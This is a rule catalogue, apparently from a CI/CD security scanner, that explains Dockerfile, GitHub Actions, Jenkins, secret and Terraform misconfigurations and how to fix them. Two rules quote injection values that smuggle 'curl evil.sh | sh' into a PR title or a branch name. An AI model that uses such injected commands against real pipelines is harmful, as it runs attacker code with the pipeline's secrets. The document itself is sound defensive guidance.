## PG-DKR-001

**Container runs as root** · severity: medium · applies to: Dockerfile

**Why it matters:** Without a USER instruction the process runs as root. A container escape or a bug in the app then gives the attacker root on the container, and often more.

**How to fix:** Create an unprivileged user and switch to it in the final stage: RUN useradd -r app && USER app.

**References:**
- https://docs.docker.com/build/building/best-practices/

## PG-DKR-002

**Base image not pinned** · severity: medium · applies to: Dockerfile

**Why it matters:** A missing tag or :latest pulls whatever the image is today, so builds change silently and a compromised or broken upstream image goes straight into production.

**How to fix:** Pin a specific version, ideally with a digest: FROM python:3.12-slim@sha256:<digest>.

**References:**
- https://docs.docker.com/build/building/best-practices/

## PG-DKR-003

**Remote script piped to a shell during build** · severity: medium · applies to: Dockerfile

**Why it matters:** curl ... | sh runs whatever the server returns at build time, with no integrity check, and bakes it into the image.

**How to fix:** Download the file, verify its checksum (sha256sum -c), then run it.

## PG-DKR-004

**Secret in ENV or ARG** · severity: high · applies to: Dockerfile

**Why it matters:** ENV values are stored in the image and ARG values appear in `docker history`, so anyone who can pull the image can read them.

**How to fix:** Use BuildKit secrets (RUN --mount=type=secret,id=token ...) at build time and inject runtime secrets from your orchestrator, not the image.

**References:**
- https://docs.docker.com/build/building/secrets/

## PG-DKR-005

**ADD downloads from a URL** · severity: medium · applies to: Dockerfile

**Why it matters:** ADD <url> fetches a remote file with no checksum, so a changed or compromised file is copied in silently.

**How to fix:** Use ADD --checksum=sha256:<hash> <url>, or RUN curl followed by sha256sum -c.

**References:**
- https://docs.docker.com/build/building/best-practices/

## PG-DKR-006

**World-writable permissions** · severity: medium · applies to: Dockerfile

**Why it matters:** chmod 777 lets any user or process in the container modify the files, including the app's own code.

**How to fix:** Give the minimum permissions needed, e.g. chmod 755 for directories and 644 for files, owned by the app user.

## PG-DKR-007

**SSH port exposed** · severity: medium · applies to: Dockerfile

**Why it matters:** Running SSH inside a container adds an extra service, credentials and attack surface; containers should be accessed with docker exec or kubectl exec.

**How to fix:** Remove the SSH server and EXPOSE 22; debug with docker exec / kubectl exec instead.

## PG-DKR-008

**No HEALTHCHECK** · severity: low · applies to: Dockerfile

**Why it matters:** Without a health check the runtime cannot tell a hung container from a healthy one, so failures stay hidden until users notice.

**How to fix:** Add HEALTHCHECK CMD <command that fails when the app is unhealthy>, or define a probe in your orchestrator.

**References:**
- https://docs.docker.com/build/building/best-practices/

## PG-GHA-001

**Action not pinned to a commit SHA** · severity: high · applies to: GitHub Actions

**Why it matters:** Tags like @v4 can be moved by whoever controls the action's repository. In March 2025 the tj-actions/changed-files tags were repointed to malicious code that dumped CI secrets into build logs.

**How to fix:** Pin to a full 40-character commit SHA and keep the version in a comment: uses: actions/checkout@<sha> # v4.2.2. `pipeguard pin` can do this for you.

**References:**
- https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions
- https://github.com/advisories/GHSA-mrrh-fwg8-r2c3

## PG-GHA-002

**pull_request_target checks out untrusted pull request code** · severity: critical · applies to: GitHub Actions

**Why it matters:** pull_request_target runs with the base repository's secrets and a write token. Checking out the pull request's head and building it lets anyone who opens a PR run code with those secrets ('pwn request').

**How to fix:** Use the pull_request trigger for building PR code. If you need pull_request_target, never check out or execute the PR's head; split the work into an unprivileged workflow plus a workflow_run step.

**References:**
- https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/

## PG-GHA-003

**Script injection from untrusted input** · severity: high · applies to: GitHub Actions

**Why it matters:** Expressions like ${{ github.event.issue.title }} are pasted into the script before it runs, so a PR title such as `"; curl evil.sh | sh #` becomes shell code running in your pipeline.

**How to fix:** Pass the value through an environment variable instead: env: TITLE: ${{ github.event.issue.title }} and use "$TITLE" in the script.

**References:**
- https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions

## PG-GHA-004

**Workflow grants write-all permissions** · severity: high · applies to: GitHub Actions

**Why it matters:** write-all gives the GITHUB_TOKEN write access to code, packages, releases and more. If any step is compromised, the attacker can push to your repository.

**How to fix:** Grant only what each job needs, e.g. permissions: { contents: read } and add specific write scopes per job.

**References:**
- https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions

## PG-GHA-005

**No explicit token permissions** · severity: medium · applies to: GitHub Actions

**Why it matters:** Without a permissions block the GITHUB_TOKEN gets the repository's default scopes, which are read-write on many older repositories and organisations.

**How to fix:** Add a top-level `permissions: { contents: read }` and widen it per job only where needed.

**References:**
- https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions

## PG-GHA-006

**Secret printed in a script** · severity: high · applies to: GitHub Actions

**Why it matters:** Masking in logs is best-effort: transformed values (base64, split strings, JSON) are not masked, and anyone with read access to the logs can see them.

**How to fix:** Never echo secrets. Pass them to tools through environment variables or files with restricted permissions.

**References:**
- https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions

## PG-GHA-007

**Remote script piped to a shell** · severity: medium · applies to: GitHub Actions

**Why it matters:** curl ... | sh runs whatever the server returns at that moment, with no integrity check.

**How to fix:** Download to a file, verify a checksum or signature, then run it, or use a pinned package or action.

## PG-GHA-008

**Checkout keeps credentials on disk** · severity: low · applies to: GitHub Actions

**Why it matters:** actions/checkout stores the GITHUB_TOKEN in .git/config by default, where later steps (or uploaded artifacts containing .git) can read it.

**How to fix:** Add `with: { persist-credentials: false }` unless a later step needs to push.

## PG-GHA-009

**Unsafe workflow commands re-enabled** · severity: high · applies to: GitHub Actions

**Why it matters:** ACTIONS_ALLOW_UNSECURE_COMMANDS re-enables the deprecated set-env and add-path commands, which let anything printed to the log (including untrusted input) change the job's environment.

**How to fix:** Remove ACTIONS_ALLOW_UNSECURE_COMMANDS and use $GITHUB_ENV and $GITHUB_PATH files instead.

**References:**
- https://github.blog/changelog/2020-10-01-github-actions-deprecating-set-env-and-add-path-commands/

## PG-GHA-010

**Self-hosted runner used for pull requests** · severity: medium · applies to: GitHub Actions

**Why it matters:** On public repositories, a pull request from a fork can run arbitrary code on your self-hosted runner and persist on that machine between jobs.

**How to fix:** Use GitHub-hosted or ephemeral runners for pull requests, or require approval for fork workflows.

**References:**
- https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/about-self-hosted-runners#self-hosted-runner-security

## PG-GHA-011

**All secrets passed to a reusable workflow** · severity: medium · applies to: GitHub Actions

**Why it matters:** secrets: inherit hands every repository and organisation secret to the called workflow, even the ones it never uses.

**How to fix:** Pass only the secrets the reusable workflow needs, by name.

## PG-JNK-001

**Pipeline can run on any agent** · severity: low · applies to: Jenkinsfile

**Why it matters:** `agent any` lets the build run on any executor, including the Jenkins controller if it has executors. Builds on the controller can read its files and secrets.

**How to fix:** Use a labelled agent (agent { label 'linux-build' }) or a container agent, and set the controller's executors to 0.

**References:**
- https://www.jenkins.io/doc/book/security/controller-isolation/

## PG-JNK-002

**Credential interpolated into a shell step** · severity: high · applies to: Jenkinsfile

**Why it matters:** In a double-quoted Groovy string, ${SECRET} is replaced before the shell runs, so the secret can appear in process listings and logs, and its value is open to shell injection. Jenkins warns about this.

**How to fix:** Use single quotes so the shell reads the environment variable itself: sh 'curl -u "$USER:$PASS" ...'.

**References:**
- https://www.jenkins.io/doc/book/pipeline/jenkinsfile/#string-interpolation

## PG-JNK-003

**Hardcoded secret in the pipeline** · severity: critical · applies to: Jenkinsfile

**Why it matters:** A secret written into the Jenkinsfile is visible to everyone who can read the repository, and stays in Git history.

**How to fix:** Store it in the Jenkins credentials store and load it with credentials('id') or withCredentials. Rotate the exposed value.

**References:**
- https://www.jenkins.io/doc/book/using/using-credentials/

## PG-JNK-004

**Remote script piped to a shell** · severity: medium · applies to: Jenkinsfile

**Why it matters:** curl ... | sh on a build agent runs whatever the server returns, with the agent's credentials and network access.

**How to fix:** Download the script, verify its checksum, then run it, or install a pinned package.

## PG-JNK-005

**Container agent image not pinned** · severity: medium · applies to: Jenkinsfile

**Why it matters:** A docker agent without a tag, or with :latest, changes underneath the pipeline and can pull a compromised image.

**How to fix:** Pin the image to a version and ideally a digest: image 'maven:3.9.9-eclipse-temurin-21@sha256:<digest>'.

## PG-JNK-006

**Privileged container or Docker socket mounted** · severity: high · applies to: Jenkinsfile

**Why it matters:** --privileged or mounting /var/run/docker.sock gives the build root-level control of the agent host, so any compromised build step can take over the machine and other builds on it.

**How to fix:** Drop --privileged and the socket mount. Build images with rootless tools such as BuildKit rootless, Kaniko or Buildah.

## PG-JNK-007

**No pipeline timeout** · severity: low · applies to: Jenkinsfile

**Why it matters:** Without a timeout a hung or abused build can hold an agent indefinitely, blocking other builds (and, for crypto-mining abuse, running up costs).

**How to fix:** Add options { timeout(time: 30, unit: 'MINUTES') } or wrap stages in timeout(...).

## PG-JNK-008

**Command injection from build parameters or branch names** · severity: high · applies to: Jenkinsfile

**Why it matters:** Parameters, branch names and pull request titles are controlled by whoever triggers the build. Interpolated into a double-quoted shell step, a value like `main; curl evil.sh | sh` runs as code.

**How to fix:** Pass the value through the environment and quote it in the shell: withEnv(["TARGET=${params.TARGET}"]) { sh 'deploy "$TARGET"' }, and validate it against an allow-list.

**References:**
- https://www.jenkins.io/doc/book/pipeline/jenkinsfile/#string-interpolation

## PG-JNK-009

**Approval gate open to anyone** · severity: medium · applies to: Jenkinsfile

**Why it matters:** An input step without `submitter` lets any user with Build permission approve the step, for example a production deployment.

**How to fix:** Restrict approvers: input message: 'Deploy to prod?', submitter: 'release-managers'.

## PG-JNK-010

**Dynamic code loading** · severity: medium · applies to: Jenkinsfile

**Why it matters:** @Grab downloads libraries at run time, and evaluate()/load run Groovy from strings or workspace files, so code from outside the reviewed Jenkinsfile can run with pipeline privileges.

**How to fix:** Use a trusted, versioned shared library (@Library('name@v1.2.0')) instead.

## PG-SEC-001

**AWS access key ID committed** · severity: critical · applies to: Secrets (all files)

**Why it matters:** AWS access keys in a repository are found by automated scanners within minutes and used to run up bills or steal data.

**How to fix:** Remove it from the file, rotate the credential immediately (it is in Git history), and load it from a secrets manager.

**References:**
- https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_access-keys.html

## PG-SEC-002

**Private key committed** · severity: critical · applies to: Secrets (all files)

**Why it matters:** A private key in the repository lets anyone with read access impersonate the server, user or signing identity it belongs to.

**How to fix:** Remove it from the file, rotate the credential immediately (it is in Git history), and load it from a secrets manager.

## PG-SEC-003

**GitHub token committed** · severity: critical · applies to: Secrets (all files)

**Why it matters:** A GitHub token gives access to repositories, packages and sometimes organisation settings with the owner's permissions.

**How to fix:** Remove it from the file, rotate the credential immediately (it is in Git history), and load it from a secrets manager.

**References:**
- https://docs.github.com/en/code-security/secret-scanning

## PG-SEC-004

**Slack token or webhook committed** · severity: high · applies to: Secrets (all files)

**Why it matters:** Slack tokens and incoming webhooks let anyone post (or read) messages as your integration, which is useful for phishing your own staff.

**How to fix:** Remove it from the file, rotate the credential immediately (it is in Git history), and load it from a secrets manager.

## PG-SEC-005

**Password embedded in a URL** · severity: high · applies to: Secrets (all files)

**Why it matters:** user:password@host URLs leak the password into logs, shell history, process lists and error messages.

**How to fix:** Use a credential helper or pass the password through a secret environment variable, never in the URL.

## PG-TF-001

**Admin port open to the internet** · severity: high · applies to: Terraform

**Why it matters:** SSH (22) or RDP (3389) open to 0.0.0.0/0 is scanned and brute-forced within minutes of going live.

**How to fix:** Restrict the source to your VPN or office range, or remove the rule and use AWS Systems Manager Session Manager.

**References:**
- https://docs.aws.amazon.com/securityhub/latest/userguide/ec2-controls.html

## PG-TF-002

**S3 bucket can be made public** · severity: high · applies to: Terraform

**Why it matters:** A public-read ACL or a disabled public access block can expose every object in the bucket to the internet.

**How to fix:** Use acl = "private" (or no ACL with bucket owner enforced) and keep all four public access block settings true.

**References:**
- https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-block-public-access.html

## PG-TF-003

**IAM policy grants full admin** · severity: critical · applies to: Terraform

**Why it matters:** Action * on Resource * (or AdministratorAccess) lets the holder do anything in the account, so one leaked key or compromised workload becomes a full account takeover.

**How to fix:** Grant only the actions and resources the role needs; start from AWS managed job-function policies and use IAM Access Analyzer to generate least-privilege policies.

**References:**
- https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege

## PG-TF-004

**Cloud credentials hardcoded in the provider** · severity: critical · applies to: Terraform

**Why it matters:** Access keys in a provider block are committed to Git and readable by everyone with repository access.

**How to fix:** Remove them and use environment variables, an AWS profile, or OIDC role assumption in CI. Rotate the exposed keys.

**References:**
- https://registry.terraform.io/providers/hashicorp/aws/latest/docs#authentication-and-configuration

## PG-TF-005

**Database publicly accessible** · severity: high · applies to: Terraform

**Why it matters:** publicly_accessible = true gives the database a public endpoint, leaving only the password between the internet and your data.

**How to fix:** Set publicly_accessible = false and reach the database from inside the VPC or through a bastion/SSM.

## PG-TF-006

**Storage not encrypted at rest** · severity: medium · applies to: Terraform

**Why it matters:** Unencrypted volumes, snapshots and database storage can be read by anyone who obtains a copy, and fail most compliance standards.

**How to fix:** Set storage_encrypted = true (RDS) or encrypted = true (EBS), ideally with a customer-managed KMS key.

## PG-TF-007

**Instance metadata allows IMDSv1** · severity: medium · applies to: Terraform

**Why it matters:** IMDSv1 answers simple GET requests, so an SSRF bug in any app on the instance can steal its IAM role credentials (the technique used in the 2019 Capital One breach).

**How to fix:** Add metadata_options { http_tokens = "required" } to require IMDSv2.

**References:**
- https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html

## PG-TF-008

**Secret hardcoded in Terraform** · severity: high · applies to: Terraform

**Why it matters:** Literal passwords in variables or resources end up in Git history and in the Terraform state file.

**How to fix:** Mark the variable sensitive with no default and supply it from a secrets manager, or use manage_master_user_password = true for RDS.
